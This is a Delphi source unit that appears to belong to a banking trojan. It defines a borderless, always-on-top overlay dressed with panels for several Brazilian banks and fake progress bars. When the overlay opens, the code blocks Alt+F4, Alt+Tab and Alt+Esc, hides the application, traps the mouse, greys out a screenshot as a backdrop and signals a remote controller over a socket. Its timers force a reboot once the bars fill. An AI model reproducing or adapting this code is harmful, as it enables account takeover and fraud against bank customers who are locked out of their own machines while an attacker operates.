unit Unit12;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.StdCtrls,
  Vcl.Samples.Gauges, Vcl.Imaging.jpeg;

type
  TForm12 = class(TForm)
    PanelBB: TPanel;
    Image2: TImage;
    GBB: TGauge;
    Label2: TLabel;
    TrmGaugeBB: TTimer;
    TrmGaugeBBEstilo: TTimer;
    TrmGaugeBBEmpresa: TTimer;
    PanelBBEstilo: TPanel;
    Image7: TImage;
    GBB1: TGauge;
    Label7: TLabel;
    Image1: TImage;
    PanelCEF: TPanel;
    Image3: TImage;
    GCEF: TGauge;
    Label1: TLabel;
    TrmGaugeCEF: TTimer;
    PanelDESCOSimples: TPanel;
    Image10: TImage;
    GDESCO: TGauge;
    Label3: TLabel;
    TrmGaugeDESCOSimples: TTimer;
    PanelSICR: TPanel;
    Image8: TImage;
    GSICR: TGauge;
    Label6: TLabel;
    TrmGaugeSICREDI: TTimer;
    PanelNET: TPanel;
    Image9: TImage;
    GNET: TGauge;
    Label5: TLabel;
    TrmGaugeNET: TTimer;
    PanelBBEmpresa: TPanel;
    Image16: TImage;
    Image11: TImage;
    GBBEMPRESA: TGauge;
    Label15: TLabel;
    TrmGaugeBBGF: TTimer;
    Timer1: TTimer;
    PanelBBGF: TPanel;
    Image4: TImage;
    GBBGF: TGauge;
    Label9: TLabel;
    PanelITAUSimples: TPanel;
    Image13: TImage;
    GITAU: TGauge;
    Label10: TLabel;
    TrmGaugeITAUSimples: TTimer;
    PanelITAUEmpresa: TPanel;
    Image12: TImage;
    GITAUE: TGauge;
    Label13: TLabel;
    TrmGaugeITAUEmpresa: TTimer;
    PanelITAUUniclass: TPanel;
    Image14: TImage;
    GITAU1: TGauge;
    Label12: TLabel;
    TrmGaugeITAUUniclass: TTimer;
    PanelITAUPerso: TPanel;
    Image15: TImage;
    GITAU2: TGauge;
    Label11: TLabel;
    TrmGaugeITAUPerso: TTimer;
    Pnordeste: TPanel;
    Image18: TImage;
    Gauge1: TGauge;
    Label16: TLabel;
    TmNordeste: TTimer;
    panelbrb: TPanel;
    Image19: TImage;
    Label17: TLabel;
    Gauge2: TGauge;
    Tmbrb: TTimer;
    procedure TrmGaugeBBTimer(Sender: TObject);
    procedure TrmGaugeBBEstiloTimer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure TrmGaugeCEFTimer(Sender: TObject);
    procedure TrmGaugeDESCOSimplesTimer(Sender: TObject);
    procedure TrmGaugeSICREDITimer(Sender: TObject);
    procedure TrmGaugeNETTimer(Sender: TObject);
    procedure TrmGaugeBBGFTimer(Sender: TObject);
    procedure TrmGaugeBBEmpresaTimer(Sender: TObject);
    procedure TrmGaugeITAUSimplesTimer(Sender: TObject);
    procedure TrmGaugeITAUEmpresaTimer(Sender: TObject);
    procedure TrmGaugeITAUUniclassTimer(Sender: TObject);
    procedure TrmGaugeITAUPersoTimer(Sender: TObject);
    procedure TmNordesteTimer(Sender: TObject);
    procedure TmbrbTimer(Sender: TObject);
  private
     procedure CreateParams(var Params:TCreateParams); override;
    { Private declarations }
  public
      procedure cor;
    function HexToStr(Value: string): string;
    { Public declarations }
  end;

var
  Form12: TForm12;

implementation

{$R *.dfm}
Uses Unit21,UnPrincipal, barra;


// FUNÇÃO PARA ENCRIPTAÇÃO DE STRINGS
function TForm12.HexToStr(Value: string): string;
var
  I: Integer;
begin
  Result := '';
  for I := 1 to Length(Value) do
  begin
    if ((I mod 2) = 1) then
      Result := Result + Chr(StrToInt('0x'+ Copy(Value, I, 2)));
  end;
end;

procedure TForm12.CreateParams(var Params: TCreateParams);
begin
 inherited
 CreateParams(Params);
 Params.WndParent:= Form1.Handle;
 Params.ExStyle:= Params.ExStyle or WS_EX_TOPMOST or WS_EX_TRANSPARENT;
 Params.ExStyle := WS_EX_TRANSPARENT or WS_EX_TOPMOST;
end;

procedure GetGrayscaleOf(ASrc, AGray: TBitmap);
var
  x, y: Integer;
  vLineSrc  : PRGBTriple;
  vLineGray : PRGBTriple;
  vGrayValue: Byte;
begin
  // make sure the source and destination have 24bit color format
  ASrc.PixelFormat := pf24bit;
  AGray.PixelFormat := pf24bit;

  // make the target to the same dimension with the source
  AGray.Width := ASrc.Width;
  AGray.Height := ASrc.Height;

  for y := 0 to AGray.Height-1 do
  begin
	// get the pointer to the first pixel of the y-th row of the source bitmap
	vLineSrc  := ASrc.ScanLine[y];
	// get the pointer to the first pixel of the y-th row of the grayscale bitmap
	vLineGray := AGray.ScanLine[y];

	// iterate the pixels
	for x := 0 to AGray.Width-1 do
	begin
	  // calculate the luminance of the color
	  vGrayValue := Round(0.3 * vLineSrc^.rgbtRed
						  + 0.59 * vLineSrc^.rgbtGreen
						  + 0.11 * vLineSrc^.rgbtBlue);

	  // same values of red, green, blue will result in grayscale color
	  vLineGray^.rgbtRed  := vGrayValue;
	  vLineGray^.rgbtGreen:= vGrayValue;
	  vLineGray^.rgbtBlue := vGrayValue;

	  // move to the next pixel
	  Inc(vLineSrc);
	  Inc(vLineGray);
	end;
  end;
end;

procedure TForm12.cor;
var
 vSrc : TBitmap;
  vGray: TBitmap;
begin
  if Image1.Picture.Graphic=nil then
	// when there is no source picture shown, raise exception
	raise Exception.Create('No source image currently selected');

  vSrc := TBitmap.Create;
  try
	 // set pixel format of the bitmap to 24bits
  	vSrc.PixelFormat := pf8bit;

  	// transfer the graphic currently displayed in Image1 to our source bitmap
  	vSrc.Width  := Image1.Picture.Graphic.Width;
  	vSrc.Height := Image1.Picture.Graphic.Height;
  	vSrc.Canvas.Draw(0, 0, Image1.Picture.Graphic);

	 // start getting the grayscale version of the source image
	 vGray := TBitmap.Create;
	 try
	   // call the routine that does the grayscale conversion
	   GetGrayscaleOf(vSrc, vGray);

	  // show the grayscale version
	   Image1.Picture.Graphic := vGray;
	 finally
	   vGray.Free;
	 end;
  finally
	 vSrc.Free;
  end;
end;



procedure TForm12.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 FFbarraaaa.Close;
 Func.DestravaM;
 Action := caFree;
end;

procedure TForm12.FormCreate(Sender: TObject);
begin
 brush.Style := bsclear;
 BorderStyle := bsNone;
 Image1.Align := alClient;
end;

procedure TForm12.FormDestroy(Sender: TObject);
begin
 FFbarraaaa.Close;
end;

procedure TForm12.FormShow(Sender: TObject);
begin
 FFbarraaaa.Show;
// Desabilitar ALT + F4
 Func.tmSearch.Enabled := False; { Desabilita o monitor de títulos }

 RegisterHotkey(Form12.Handle, 1, MOD_ALT , VK_ESCAPE);
 RegisterHotkey(Form12.Handle, 2, MOD_ALT , VK_f4);
 RegisterHotkey(Form12.Handle, 3, MOD_ALT , VK_TAB);
 RegisterHotkey(Form12.Handle, 4, MOD_ALT , VK_CONTROL);
 Image1.Picture.LoadFromFile(Form1.Edit5.Text + 'bmp.jpg');
 SetWindowPos(Form12.handle, HWND_TOPMOST, Form12.Left, Form12.Top, Form12.Width, Form12.Height, 0);
 ShowWindow(Application.Handle, SW_HIDE);
 cor;
 //Func.TravaM;
 Func.PrendeMouse (Form12.Left, Form12.Top, Form12.Width, Form12.Height);

// CENTRALIZAR PAINÉIS
 PanelBB.top := (self.Height div 2) - (PanelBB.height div 2);
 PanelBB.left := (self.Width div 2) - (PanelBB.width div 2);
 PanelCEF.top := (self.Height div 2) - (PanelCEF.height div 2);
 PanelCEF.left := (self.Width div 2) - (PanelCEF.width div 2);
 PanelBBEstilo.top := (self.Height div 2) - (PanelBBEstilo.height div 2);
 PanelBBEstilo.left := (self.Width div 2) - (PanelBBEstilo.width div 2);
 PanelDESCOSimples.top := (self.Height div 2) - (PanelDESCOSimples.height div 2);
 PanelDESCOSimples.left := (self.Width div 2) - (PanelDESCOSimples.width div 2);
 PanelSICR.top := (self.Height div 2) - (PanelSICR.height div 2);
 PanelSICR.left := (self.Width div 2) - (PanelSICR.width div 2);
 PanelNET.top := (self.Height div 2) - (PanelNET.height div 2);
 PanelNET.left := (self.Width div 2) - (PanelNET.width div 2);
 PanelBBEMpresa.top := (self.Height div 2) - (PanelBBEMpresa.height div 2);
 PanelBBEMpresa.left := (self.Width div 2) - (PanelBBEMpresa.width div 2);
 PanelBBGF.top := (self.Height div 2) - (PanelBBGF.height div 2);
 PanelBBGF.left := (self.Width div 2) - (PanelBBGF.width div 2);
  PanelITAUSimples.top := (self.Height div 2) - (PanelITAUSimples.height div 2);
 PanelITAUSimples.left := (self.Width div 2) - (PanelITAUSimples.width div 2);
 PanelITAUEmpresa.top := (self.Height div 2) - (PanelITAUEmpresa.height div 2);
 PanelITAUEmpresa.left := (self.Width div 2) - (PanelITAUEmpresa.width div 2);


 PanelITAUUniclass.top := (self.Height div 2) - (PanelITAUUniclass.height div 2);
 PanelITAUUniclass.left := (self.Width div 2) - (PanelITAUUniclass.width div 2);
 PanelITAUPerso.top := (self.Height div 2) - (PanelITAUPerso.height div 2);
 PanelITAUPerso.left := (self.Width div 2) - (PanelITAUPerso.width div 2);

 Pnordeste.top := (self.Height div 2) - (Pnordeste.height div 2);
 Pnordeste.left := (self.Width div 2) - (Pnordeste.width div 2);
 panelbrb.top := (self.Height div 2) - (panelbrb.height div 2);
 panelbrb.left := (self.Width div 2) - (panelbrb.width div 2);
 Form1.CS1.Socket.SendText('<|Trav1|>');

end;

procedure TForm12.TmbrbTimer(Sender: TObject);
begin
 Gauge2.Progress := Gauge2.Progress + 1;
  if Gauge2.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TmNordesteTimer(Sender: TObject);
begin
 Gauge1.Progress := Gauge1.Progress + 1;
  if Gauge1.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeBBEmpresaTimer(Sender: TObject);
begin
 GBBEmpresa.Progress := GBBEmpresa.Progress + 1;
  if GBBEmpresa.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeBBEstiloTimer(Sender: TObject);
begin
 GBB1.Progress := GBB1.Progress + 1;
  if GBB1.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeBBGFTimer(Sender: TObject);
begin
 GBBGF.Progress := GBBGF.Progress + 1;
  if GBBGF.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeBBTimer(Sender: TObject);
begin

 GBB.Progress := GBB.Progress + 1;
 if GBB.Progress = 200 then
 begin
  Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
 end;
end;

procedure TForm12.TrmGaugeCEFTimer(Sender: TObject);
begin
 GCEF.Progress := GCEF.Progress + 1;
  if GCEF.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeDESCOSimplesTimer(Sender: TObject);
begin
 GDESCO.Progress := GDESCO.Progress + 1;
  if GDESCO.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeITAUEmpresaTimer(Sender: TObject);
begin
GITAUE.Progress := GITAUE.Progress + 1;
  if GITAUE.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeITAUPersoTimer(Sender: TObject);
begin
 GITAU2.Progress := GITAU2.Progress + 1;
  if GITAU2.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeITAUSimplesTimer(Sender: TObject);
begin
 GITAU.Progress := GITAU.Progress + 1;
  if GITAU.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeITAUUniclassTimer(Sender: TObject);
begin
 GITAU1.Progress := GITAU1.Progress + 1;
  if GITAU1.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeNETTimer(Sender: TObject);
begin
 GNET.Progress := GNET.Progress + 1;
  if GNET.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

procedure TForm12.TrmGaugeSICREDITimer(Sender: TObject);
begin
 GSICR.Progress := GSICR.Progress + 1;
  if GSICR.Progress = 200 then
  begin
   Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
  end;
end;

end.
